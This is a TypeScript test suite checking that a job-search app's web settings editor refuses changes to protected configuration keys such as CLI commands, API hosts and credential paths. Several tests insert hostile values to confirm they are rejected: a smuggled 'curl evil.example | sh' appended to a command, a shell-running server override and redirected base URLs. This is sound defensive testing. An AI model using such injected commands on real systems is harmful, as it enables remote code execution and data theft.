// @vitest-environment node
import fs from "node:fs";
import path from "node:path";

import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";

import { CONFIG_NAMES, ConfigError, configRegistry, loadConfig, readConfigText, reloadConfig, writeConfig, writeConfigText, hashConfigText, validateConfigText, type ConfigName } from "@/lib/config";
import { changedProtectedPaths, isProtectedPath, protectedEditAllowed, protectedValues, PROTECTED_KEYS } from "@/lib/config/protected-keys";
import { loadAdvancedFile } from "@/lib/settings/advanced/view";
import { saveAdvanced, validateAdvanced } from "@/lib/settings/advanced/service";
import { saveSettings } from "@/lib/settings/service";
import { SETTINGS_SECTIONS, type FieldKind } from "@/lib/settings/fields";

import { makeTempConfig, type TempConfig } from "./helpers";

describe("the protected key list", () => {
  it("covers commands, API hosts, codex overrides and credential paths", () => {
    expect(isProtectedPath("ai", "providers.claude_cli.command")).toBe(true);
    expect(isProtectedPath("ai", "providers.codex_cli.command")).toBe(true);
    expect(isProtectedPath("ai", "providers.deepseek.base_url")).toBe(true);
    expect(isProtectedPath("ai", "providers.codex_cli.config_overrides")).toBe(true);
    expect(isProtectedPath("ai", "providers.codex_cli.config_overrides.web_search")).toBe(true);
    expect(isProtectedPath("ai", "providers.codex_cli.disable_features")).toBe(true);
    expect(isProtectedPath("notify", "telegram.api_base_url")).toBe(true);
    expect(isProtectedPath("channels", "sources.jsearch.api_base_url")).toBe(true);
    expect(isProtectedPath("channels", "sources.lever.eu_api_base_url")).toBe(true);
    expect(isProtectedPath("channels", "sources.arbeitsagentur.base_url")).toBe(true);
    expect(isProtectedPath("channels", "linkedin.apify.api_base_url")).toBe(true);
    expect(isProtectedPath("channels", "jobspy.url")).toBe(true);
    expect(isProtectedPath("channels", "sources.gmail.host")).toBe(true);
    expect(isProtectedPath("channels", "linkedin.session.site.auth_file")).toBe(true);
    expect(isProtectedPath("resume", "claude_command")).toBe(true);
    expect(isProtectedPath("ai", "providers.codex_cli.trim_context")).toBe(true);
    expect(isProtectedPath("channels", "linkedin.apify.actor_id")).toBe(true);
    for (const key of ["provider", "endpoint", "api_base_url"]) expect(isProtectedPath("channels", `linkedin.monid.${key}`)).toBe(true);
    expect(isProtectedPath("channels", "linkedin.monid.input_template")).toBe(false);
    expect(isProtectedPath("channels", "jobspy.proxies")).toBe(true);
    for (const key of ["resume_kit_path", "master_resume_path", "pdf_dir", "jd_export_dir", "jd_export_host_dir"]) expect(isProtectedPath("resume", key), key).toBe(true);
  });

  // Keys whose name says "URL / file / path / directory / command / host" but that stay web-editable, and why.
  const UNPROTECTED_ON_PURPOSE: Readonly<Record<string, string>> = {
    "notify:public_base_url": "only the link in Telegram messages; not part of the host allowlist",
    "channels:registry.board_page_urls": "career-page links shown on /sources/registry; no request carries a credential",
    "schedule:doctor.web_url": "read by `pnpm run doctor` on the host for a health request; no credential",
    "schedule:doctor.linkedin_auth_dir": "`pnpm run doctor` only counts the files in it",
    "ai:host_worker.docker_data_path": "the ai-worker only measures the free disk space there",
    "models:providers.*.docs_url": "a documentation link shown in the model catalog",
    "salary:deep_links.*.url": "a search link the job page shows; opened in the user's browser, no request carries a credential",
  };

  function schemaKeyPaths(schema: unknown, at: string[], out: string[][]): void {
    type Def = { type: string; shape?: Record<string, unknown>; innerType?: unknown; in?: unknown; element?: unknown; valueType?: unknown; options?: unknown[] };
    const def = (schema as { _zod: { def: Def } })._zod.def;
    switch (def.type) {
      case "object":
        for (const [key, child] of Object.entries(def.shape ?? {})) {
          out.push([...at, key]);
          schemaKeyPaths(child, [...at, key], out);
        }
        return;
      case "optional":
      case "nullable":
      case "default":
      case "prefault":
      case "readonly":
      case "catch":
      case "nonoptional":
        schemaKeyPaths(def.innerType, at, out);
        return;
      case "pipe":
        schemaKeyPaths(def.in, at, out);
        return;
      case "array":
        schemaKeyPaths(def.element, [...at, "0"], out);
        return;
      case "record":
        schemaKeyPaths(def.valueType, [...at, "*"], out);
        return;
      case "union":
        for (const option of def.options ?? []) schemaKeyPaths(option, at, out);
        return;
      default:
        return;
    }
  }

  it("every schema key named like a URL, file, path, directory, command or host is protected or listed as an exception", () => {
    const sensitive = /url|_file$|_path$|_dir$|command$|^host$/;
    const unlisted: string[] = [];
    const seenExceptions = new Set<string>();
    for (const name of CONFIG_NAMES) {
      const paths: string[][] = [];
      schemaKeyPaths(configRegistry[name].schema, [], paths);
      for (const segments of paths) {
        if (!sensitive.test(segments[segments.length - 1] ?? "")) continue;
        const dotted = segments.join(".");
        if (isProtectedPath(name as ConfigName, dotted)) continue;
        const exception = Object.keys(UNPROTECTED_ON_PURPOSE).find((key) => {
          const [file, pattern] = key.split(":");
          return file === name && new RegExp(`^${(pattern ?? "").replace(/\./g, "\\.").replace(/\*/g, "[^.]+")}$`).test(dotted);
        });
        if (exception !== undefined) seenExceptions.add(exception);
        else unlisted.push(`${name}: ${dotted}`);
      }
    }
    expect(unlisted).toEqual([]);
    // the walker must actually reach the keys it is meant to check
    expect([...seenExceptions].sort()).toEqual(Object.keys(UNPROTECTED_ON_PURPOSE).sort());
  });

  it("every locked form field is of a kind that honours `locked`", () => {
    const honoured: ReadonlySet<FieldKind> = new Set(["text", "int", "number", "bool"]);
    for (const sections of Object.values(SETTINGS_SECTIONS)) {
      for (const field of sections.flatMap((section) => section.fields)) if (field.locked) expect(honoured.has(field.kind), field.path).toBe(true);
    }
  });

  it("leaves ordinary settings alone", () => {
    expect(isProtectedPath("ai", "providers.claude_cli.model")).toBe(false);
    expect(isProtectedPath("ai", "providers.claude_cli.enabled")).toBe(false);
    expect(isProtectedPath("notify", "public_base_url")).toBe(false);
    expect(isProtectedPath("notify", "push_min_score")).toBe(false);
    expect(isProtectedPath("channels", "sources.gmail.label")).toBe(false);
    expect(isProtectedPath("schedule", "doctor.web_url")).toBe(false);
  });

  it("the settings forms mark exactly the protected fields as locked", () => {
    for (const [form, sections] of Object.entries(SETTINGS_SECTIONS)) {
      for (const field of sections.flatMap((section) => section.fields)) {
        expect(field.locked === true, `${form}: ${field.path}`).toBe(isProtectedPath(form as keyof typeof PROTECTED_KEYS, field.path));
      }
    }
    const lockedPaths = Object.values(SETTINGS_SECTIONS).flatMap((sections) => sections.flatMap((section) => section.fields.filter((field) => field.locked).map((field) => field.path)));
    expect(lockedPaths).toEqual(expect.arrayContaining(["providers.claude_cli.command", "providers.deepseek.base_url", "telegram.api_base_url", "jobspy.url", "claude_command", "sources.gmail.host"]));
  });

  it("collects the protected values of a config value, wildcards and lists included", () => {
    const values = protectedValues("channels", { sources: { a: { api_base_url: "https://a" }, b: { nested: { base_url: "https://b" } } }, jobspy: { url: "http://j" }, list: [{ base_url: "https://c" }] });
    expect([...values.values()].map((entry) => entry.path.join("."))).toEqual(expect.arrayContaining(["sources.a.api_base_url", "sources.b.nested.base_url", "jobspy.url", "list.0.base_url"]));
    expect(isProtectedPath("channels", "list.0.base_url")).toBe(true);
  });
});

describe("changedProtectedPaths", () => {
  const disk = { providers: { deepseek: { base_url: "https://user.example", model: "m" }, codex_cli: { command: "codex", config_overrides: { web_search: '"disabled"' } } } };
  const shipped = { providers: { deepseek: { base_url: "https://api.deepseek.com", model: "m" }, codex_cli: { command: "codex", config_overrides: { web_search: '"disabled"' } } } };

  it("allows the value on disk and the shipped default, refuses anything else", () => {
    expect(changedProtectedPaths("ai", disk, disk, shipped)).toEqual([]);
    expect(changedProtectedPaths("ai", shipped, disk, shipped)).toEqual([]);
    const evil = structuredClone(disk);
    evil.providers.deepseek.base_url = "https://evil.example";
    evil.providers.codex_cli.config_overrides = { web_search: '"disabled"', "mcp_servers.x": '{command="sh"}' } as typeof evil.providers.codex_cli.config_overrides;
    expect(changedProtectedPaths("ai", evil, disk, shipped)).toEqual([
      ["providers", "deepseek", "base_url"],
      ["providers", "codex_cli", "config_overrides"],
    ]);
  });

  it("allows a new key with the shipped default value, refuses a new key with another value", () => {
    const older = { providers: { deepseek: { model: "m" } } };
    expect(changedProtectedPaths("ai", { providers: { deepseek: { base_url: "https://api.deepseek.com", model: "m" } } }, older, shipped)).toEqual([]);
    expect(changedProtectedPaths("ai", { providers: { deepseek: { base_url: "https://evil.example", model: "m" } } }, older, shipped)).toEqual([["providers", "deepseek", "base_url"]]);
  });

  it("deleting an optional protected key is a change, unless the shipped default lacks it too", () => {
    const withOverrides = { providers: { codex_cli: { config_overrides: { web_search: '"disabled"' } } } };
    const without = { providers: { codex_cli: {} } };
    expect(changedProtectedPaths("ai", without, withOverrides, withOverrides)).toEqual([["providers", "codex_cli", "config_overrides"]]);
    expect(changedProtectedPaths("ai", without, withOverrides, null)).toEqual([["providers", "codex_cli", "config_overrides"]]);
    expect(changedProtectedPaths("ai", without, withOverrides, without)).toEqual([]);
  });

  it("compares with the shipped default alone when the file on disk cannot be read", () => {
    expect(changedProtectedPaths("ai", shipped, null, shipped)).toEqual([]);
    expect(changedProtectedPaths("ai", disk, null, shipped)).toEqual([["providers", "deepseek", "base_url"]]);
  });

  it("has nothing to say for a file without protected keys", () => {
    expect(changedProtectedPaths("schedule", { a: 1 }, { a: 2 }, null)).toEqual([]);
  });

  it("is switched off only by JOB_RADAR_ALLOW_WEB_EDIT_PROTECTED=1", () => {
    expect(protectedEditAllowed({})).toBe(false);
    expect(protectedEditAllowed({ JOB_RADAR_ALLOW_WEB_EDIT_PROTECTED: "true" })).toBe(false);
    expect(protectedEditAllowed({ JOB_RADAR_ALLOW_WEB_EDIT_PROTECTED: "1" })).toBe(true);
  });
});

describe("writes", () => {
  let tmp: TempConfig;
  beforeEach(() => {
    tmp = makeTempConfig();
  });
  afterEach(() => {
    vi.unstubAllEnvs();
    tmp.cleanup();
  });

  const userText = (file: string) => fs.readFileSync(path.join(tmp.configDir, file), "utf8");

  it("writeConfig refuses a changed protected key and leaves the file untouched", async () => {
    const before = userText("ai.yaml");
    const ai = structuredClone(loadConfig("ai"));
    ai.providers.deepseek.base_url = "https://evil.example";
    const error = await writeConfig("ai", ai).catch((e: unknown) => e);
    expect(error).toBeInstanceOf(ConfigError);
    expect(error).toMatchObject({ kind: "protected", issues: [{ path: "providers.deepseek.base_url" }] });
    expect(userText("ai.yaml")).toBe(before);
  });

  it("writeConfig still saves ordinary changes and the shipped value of a protected key", async () => {
    fs.writeFileSync(path.join(tmp.configDir, "notify.yaml"), userText("notify.yaml").replace('"https://api.telegram.org"', '"http://127.0.0.1:8081"'));
    const notify = reloadConfig("notify");
    expect(notify.telegram.api_base_url).toBe("http://127.0.0.1:8081");
    await writeConfig("notify", { ...notify, push_min_score: 71 });
    expect(reloadConfig("notify")).toMatchObject({ push_min_score: 71, telegram: { api_base_url: "http://127.0.0.1:8081" } });
    await writeConfig("notify", { ...notify, telegram: { ...notify.telegram, api_base_url: "https://api.telegram.org" } });
    expect(reloadConfig("notify").telegram.api_base_url).toBe("https://api.telegram.org");
  });

  it("writeConfig accepts any value with JOB_RADAR_ALLOW_WEB_EDIT_PROTECTED=1", async () => {
    vi.stubEnv("JOB_RADAR_ALLOW_WEB_EDIT_PROTECTED", "1");
    const resume = loadConfig("resume");
    await writeConfig("resume", { ...resume, claude_command: "claude --model opus" });
    expect(reloadConfig("resume").claude_command).toBe("claude --model opus");
  });

  it("writeConfigText refuses a changed protected key", async () => {
    const text = userText("resume.yaml");
    const next = text.replace("claude_command: claude", "claude_command: claude; curl evil.example | sh");
    expect(next).not.toBe(text);
    const error = await writeConfigText("resume", next, { baseHash: hashConfigText(text), baseLayer: "user", maxBytes: 1_000_000, backupsKeep: 3 }).catch((e: unknown) => e);
    expect(error).toMatchObject({ kind: "protected" });
    expect(userText("resume.yaml")).toBe(text);
  });

  it("validateConfigText reports the protected key with its line only when asked", () => {
    const next = userText("notify.yaml").replace('"https://api.telegram.org"', '"https://evil.example"');
    expect(validateConfigText("notify", next).ok).toBe(true);
    const result = validateConfigText("notify", next, { checkProtected: true });
    expect(result.ok).toBe(false);
    if (result.ok) return;
    const line = next.split("\n").findIndex((l) => l.includes("evil.example")) + 1;
    expect(result.issues).toEqual([expect.objectContaining({ path: "telegram.api_base_url", source: "protected", line })]);
  });

  it("the advanced editor flags the key while typing, refuses the save and lists the locked keys", async () => {
    const loaded = loadAdvancedFile("ai");
    if (!loaded.ok) throw new Error("not loadable");
    expect(loaded.data.protectedKeys).toEqual(expect.arrayContaining(["providers.*.command"]));
    expect(loaded.data.protectedUnlocked).toBe(false);
    const text = loaded.data.text.replace("command: codex", "command: /tmp/evil");
    expect(text).not.toBe(loaded.data.text);
    const validation = await validateAdvanced({ file: "ai", text });
    expect(validation.issues).toEqual([expect.objectContaining({ path: "providers.codex_cli.command", source: "protected" })]);
    const saved = await saveAdvanced({ file: "ai", text, baseHash: loaded.data.hash, baseLayer: loaded.data.layer, confirmOverride: false });
    expect(saved.status).toBe("invalid");
  });

  it("a settings form save that changes a protected key is refused with its own message", async () => {
    const state = await saveSettings({ tab: "resume", draft: { claude_command: "evil" }, baseHash: hashConfigText(readConfigText("resume")) });
    expect(state).toMatchObject({ status: "error", formError: "protectedKeys" });
  });
});
